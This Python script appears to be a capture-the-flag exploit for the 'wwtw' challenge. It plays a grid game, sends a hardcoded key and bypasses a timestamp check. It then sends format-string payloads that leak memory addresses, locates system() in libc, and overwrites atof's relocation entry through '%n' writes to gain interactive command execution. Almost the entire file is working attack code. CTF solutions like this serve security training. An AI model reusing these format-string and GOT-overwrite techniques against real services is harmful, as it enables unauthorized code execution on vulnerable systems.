import zio
import time
import struct

def parse(io):
    '''
    return a 2d array
    '''
    io.read_until("90\n")
    m = []
    for line in range(20):
        line = io.read_until("\n")
        m.append(line[3:-1])
    return m

def get_path(m, me, ET, p1, p2):
    '''
    compare two possible paths
    '''
    p1_head = True
    for i in range(min(me[1],ET[1]),max(me[1],ET[1])):
        if m[me[0]][i] == 'A':
            p1_head = False
    for i in range(min(me[0],ET[0]),max(me[0],ET[0])):
        if m[i][ET[1]] == 'A':
            p1_head = False
    if p1_head:
        return p1+p2
    else:
        return p2+p1

def move(m):
    '''
    return a string for moving
    '''
    ret = ''
    me = (0,0)
    ET = (0,0)
    for i, row in enumerate(m):
        for j, c in enumerate(row):
            if c == ">" or c == "<" or c == "^" or c == 'V':
                me = (i,j)
            elif c == 'E' or c == 'T':
                ET = (i,j)

    #print ET,me
    shifty = abs(ET[0]-me[0])
    shiftx = abs(ET[1]-me[1])
    if ET[0] >= me[0] and ET[1] >= me[1]:
        p = get_path(m,me,ET,'d'*shiftx,'s'*shifty)
    elif ET[0] >= me[0] and ET[1] < me[1]:
        p = get_path(m,me,ET,'a'*shiftx,'s'*shifty)
    elif ET[0] <= me[0] and ET[1] >= me[1]:
        p = get_path(m,me,ET,'d'*shiftx,'w'*shifty)
    else:
        p = get_path(m,me,ET,'a'*shiftx,'w'*shifty)
    return p
        

T = ("wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me",2606)
#T = ("127.0.0.1",4444)
io = zio.zio(T)
io.read_until("blink!")

#play the game
for i in range(5):
    m = parse(io)
    moves =  move(m)
    for m in moves:
        io.write(m+'\n')
        io.read_until(':')
    if i < 4:
        io.read_until("...")

#TARDIS KEY
key = "UeSlhCAGEp"
io.read_until("KEY")
io.write(key+'\n')

#timestamp check
io.read_until("Selection:")
io.write("1aaaaaaa\x00\n")
time.sleep(2)
io.write("v+YU\n") #defeat the timestamp check
time.sleep(1)
io.write("1\n")
io.write("1aaaaaaa\x07\n") #set the fd back so we don't need to write something every 2s
io.read_until('Dematerialize')
io.read_until('Dematerialize')
io.read_until('Dematerialize')

##base
time.sleep(1)
io.write("3\n")
time.sleep(1)
io.read_until("Coordinates:")
payload  ="51.492137,-0.192878zz"+"%08x."*10 +"\n"
io.write(payload)
ret = io.read_until('again')
addr1  = ret.split(".")[11]
addr2  = ret.split(".")[12]
offset = 4032
base = int(addr1,16)+offset
io.read_until("Coordinates:")
time.sleep(2)

##read addr, since we don't have system() in relocation table, we start from read()
payload  = "51.492137,-0.192878z"
payload += struct.pack("<I",base+0x5010)  #read reloc table
payload += ( "%08x."*19 +"%s" + "\n")
io.write(payload)
time.sleep(2)
ret = io.read_until("is")
ret = ret.split(".")[-1].strip()
ret = ret.split()[0][:4]
#print len(ret),"read",hex(struct.unpack("<I",ret)[0])
addr_read = struct.unpack("<I",ret)[0]

##system addr, the offset is based on the corresponding version of libc
addr_system = addr_read - 633408

##write address of system to atof's relo
relo_atof = base+0x5080 
str_system = struct.pack("<I",addr_system)
tmp = str_system[:2][::-1].encode("hex")
system1 = int(str_system[:2][::-1].encode("hex"),16)
system2 = int(str_system[2:][::-1].encode("hex"),16)
io.read_until("Coordinates:")
payload  = "51.492137,-0.192878z"
payload += struct.pack("<I",relo_atof)
payload += struct.pack("<I",relo_atof+2) #can be any random 4 bytes
payload += struct.pack("<I",relo_atof+2)
payload += ( "%08x."*18 +"%"+str(system1+186-372-8)+ "x" + "%n"+ "%"+str(system2-system1) +"x%n" + "\n")
io.write(payload)

io.interact()#after this, calling atof() becomes calling system(). we can manually input the command
